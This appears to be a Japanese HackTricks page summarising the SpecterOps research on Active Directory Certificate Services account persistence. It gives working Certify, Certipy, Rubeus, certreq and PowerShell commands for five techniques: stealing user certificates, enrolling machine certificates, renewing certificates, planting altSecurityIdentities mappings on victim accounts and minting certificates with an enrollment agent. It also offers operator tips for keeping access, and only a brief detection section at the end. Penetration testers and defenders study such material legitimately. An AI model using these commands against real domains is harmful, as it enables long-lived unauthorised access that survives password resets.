# AD CS アカウント持続性

{{#include ../../../banners/hacktricks-training.md}}

**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)の素晴らしい研究のアカウント持続性章の小さな要約です。**

## 証明書を使用したアクティブユーザー資格情報の盗難の理解 – PERSIST1

ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を得て、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの`User`テンプレートはそのような要求を許可しますが、場合によっては無効になっていることがあります。

[Certify](https://github.com/GhostPack/Certify)や[Certipy](https://github.com/ly4k/Certipy)を使用して、クライアント認証を許可する有効なテンプレートを検索し、1つを要求することができます。
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
証明書の力は、それが属するユーザーとして認証する能力にあります。パスワードの変更に関係なく、証明書が有効である限り、その能力は維持されます。

PEMをPFXに変換し、それを使用してTGTを取得できます：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注: 他の技術と組み合わせることで（THEFTセクションを参照）、証明書ベースの認証はLSASSに触れることなく、さらには非特権コンテキストからも持続的なアクセスを可能にします。

## 証明書を使用したマシンの持続性の獲得 - PERSIST2

攻撃者がホスト上で特権を持っている場合、妥協したシステムのマシンアカウントをデフォルトの`Machine`テンプレートを使用して証明書に登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供できます:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

証明書テンプレートの有効期限と更新期間を悪用することで、攻撃者は長期的なアクセスを維持できます。以前に発行された証明書とその秘密鍵を持っている場合、期限切れの前に更新することで、元の主体に関連付けられた追加のリクエストアーティファクトを残さずに、新しい長期的な資格情報を取得できます。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 操作のヒント: 攻撃者が保持するPFXファイルの有効期限を追跡し、早めに更新してください。更新により、最新のSIDマッピング拡張が含まれるようになり、厳格なDCマッピングルールの下でも使用可能になります（次のセクションを参照）。

## 明示的な証明書マッピングの植え付け (altSecurityIdentities) – PERSIST4

ターゲットアカウントの`altSecurityIdentities`属性に書き込むことができれば、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更を超えて持続し、強力なマッピング形式を使用することで、現代のDC強制の下でも機能し続けます。

高レベルのフロー:

1. 自分が制御するクライアント認証証明書を取得または発行します（例: 自分自身として`User`テンプレートに登録）。
2. 証明書から強力な識別子を抽出します（Issuer+Serial、SKI、またはSHA1-PublicKey）。
3. その識別子を使用して、被害者のプリンシパルの`altSecurityIdentities`に明示的なマッピングを追加します。
4. あなたの証明書で認証します; DCはそれを明示的なマッピングを介して被害者にマッピングします。

例 (PowerShell) 強力なIssuer+Serialマッピングを使用:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
その後、PFXで認証します。Certipyは直接TGTを取得します：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
ノート
- 強いマッピングタイプのみを使用する: X509IssuerSerialNumber, X509SKI, または X509SHA1PublicKey。弱い形式（Subject/Issuer, Subject-only, RFC822 email）は非推奨であり、DCポリシーによってブロックされる可能性があります。
- 証明書チェーンは、DCによって信頼されるルートに構築される必要があります。NTAuthのエンタープライズCAは通常信頼されており、一部の環境では公開CAも信頼されています。

弱い明示的マッピングと攻撃経路についての詳細は、以下を参照してください:

{{#ref}}
domain-escalation.md
{{#endref}}

## エンロールメントエージェントを使用した持続性 – PERSIST5

有効な証明書リクエストエージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続トークンとして保持できます。悪用ワークフロー:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
エージェント証明書またはテンプレートの権限の取り消しが、この持続性を排除するために必要です。

## 2025年の強力な証明書マッピングの強制: 持続性への影響

Microsoft KB5014754は、ドメインコントローラーにおける強力な証明書マッピングの強制を導入しました。2025年2月11日以降、DCはデフォルトで完全な強制に切り替わり、弱い/あいまいなマッピングを拒否します。実際の影響:

- SIDマッピング拡張がない2022年以前の証明書は、DCが完全な強制にある場合、暗黙のマッピングに失敗する可能性があります。攻撃者は、AD CSを通じて証明書を更新してSID拡張を取得するか、`altSecurityIdentities`に強力な明示的マッピングを植え付けることでアクセスを維持できます（PERSIST4）。
- 強力な形式（Issuer+Serial、SKI、SHA1-PublicKey）を使用した明示的マッピングは引き続き機能します。弱い形式（Issuer/Subject、Subject-only、RFC822）はブロックされる可能性があり、持続性のためには避けるべきです。

管理者は以下を監視し、警告を出すべきです:
- `altSecurityIdentities`の変更およびエンロールメントエージェントとユーザー証明書の発行/更新。
- 代理リクエストおよび異常な更新パターンのためのCA発行ログ。

## 参考文献

- Microsoft. KB5014754: Windowsドメインコントローラーにおける証明書ベースの認証の変更（強制タイムラインと強力なマッピング）。
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – コマンドリファレンス（`req -renew`、`auth`、`shadow`）。
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
